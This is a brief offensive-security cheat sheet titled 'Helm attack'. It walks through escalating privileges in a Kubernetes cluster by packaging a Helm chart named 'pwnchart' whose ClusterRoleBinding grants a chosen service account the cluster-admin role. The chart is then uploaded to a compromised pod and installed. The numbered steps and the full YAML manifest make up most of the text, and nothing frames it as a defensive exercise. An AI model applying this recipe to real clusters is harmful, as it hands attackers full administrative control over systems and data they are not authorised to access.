# Helm attack

You can apply any kubernetes `.yaml` files via Helm.

## Create helm chart to give you `cluster-admin` role

1. `helm create pwnchart`

2. Navigate to `./pwnchart/templates/`

3. Create a `.yaml` like a regualar kubernetes yaml, e.g clusterrolebinding.

```yaml
apiVersion: rbac.authorization.k8s.io/v1beta1
kind: ClusterRoleBinding
metadata:
  name: kekpwned
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
  - kind: ServiceAccount
    namespace: {{ .Values.namespace }}
    name: {{ .Values.name }}
```

4. `helm package pwnchart`

5. Upload `pwnchart-<version>.tgz` to pod and run `helm install pwnchart-<version>.tgz`

> A demo chart is provided in [pwnchart](./pwnchart) folder
>
> Run `helm package pwnchart` to create a `.tgz` archive
